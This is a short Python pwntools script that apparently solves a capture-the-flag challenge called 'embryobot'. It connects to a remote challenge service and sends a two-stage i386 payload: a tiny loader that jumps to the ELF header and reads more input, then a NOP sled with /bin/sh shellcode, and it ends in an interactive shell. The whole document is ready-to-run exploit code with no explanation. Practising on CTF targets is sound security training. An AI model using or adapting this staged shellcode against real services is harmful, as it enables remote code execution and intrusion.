from pwn import *
context.log_level = 'error'

context.update(arch='i386', os='linux')

# stage 1 - jmp back to ehdr (ecx will be ehdr)
stage_1 = asm("jmp ecx")

# stage 2 - overwrite 200 bytes from stdin 
stage_2 = asm("""
mov al, 3;
mov dl, 200;
int 0x80;
""")

# calculate padding space
left = 16 - len(stage_2)

# create [read more bytes][padding][jmp to ehdr]
init = stage_2 + b'\x90'*left + stage_1

# io = process("./embryobot")
# io = remote("172.17.0.2",2000)
io = remote("0.cloud.chals.io",20922)
# Exposed Service on :

# jmp and read more data
io.send(init)

# overwrite file with shell bytecode
io.send(b'\x90'*50 + asm(shellcraft.i386.linux.sh()) + b'\n')

# execute shell
io.interactive()

io.close()